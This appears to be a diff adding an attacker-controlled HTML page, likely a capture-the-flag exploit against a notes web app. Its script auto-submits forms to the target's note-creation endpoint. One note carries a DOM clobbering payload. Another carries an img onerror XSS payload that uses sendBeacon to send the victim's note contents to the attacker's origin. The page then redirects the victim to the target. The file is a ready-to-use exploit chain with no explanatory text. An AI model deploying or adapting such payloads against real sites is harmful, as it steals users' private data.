@@ -1,0 +1,48 @@
+<body>
+  <script>
+    const params = new URLSearchParams(location.search);
+    const baseUrl = params.get("baseUrl");
+
+    const sleep = async (msec) =>
+      new Promise((resolve) => setTimeout(resolve, msec));
+
+    const createNote = (note) => {
+      const innerHtml = `
+        <form action="${baseUrl}/api/notes/create" method="post" target="_blank">
+          <input type="text" name="note">
+        </form>
+      `;
+      document.body.innerHTML += innerHtml;
+      const form = document.forms[document.forms.length - 1];
+      form.note.value = note;
+      form.submit();
+    };
+
+    const main = async () => {
+      const note1 = `
+        <form id="noteTmpl"></form>
+        <button name="content" form="noteTmpl">
+          <form class="note">
+            <input name="setHTML">
+          </form>
+          <p class="delete"></p>
+        </button>
+        <img name="nodeType">
+      `.trim();
+
+      const note2 =
+        "<" +
+        `
+          <img src=0 onerror="navigator.sendBeacon('${location.origin}', notes.textContent)">
+        `.trim();
+
+      createNote(note1); // DOM Clobbering
+      await sleep(1000);
+      createNote(note2); // XSS
+      await sleep(1000);
+
+      location = baseUrl;
+    };
+    main();
+  </script>
+</body>
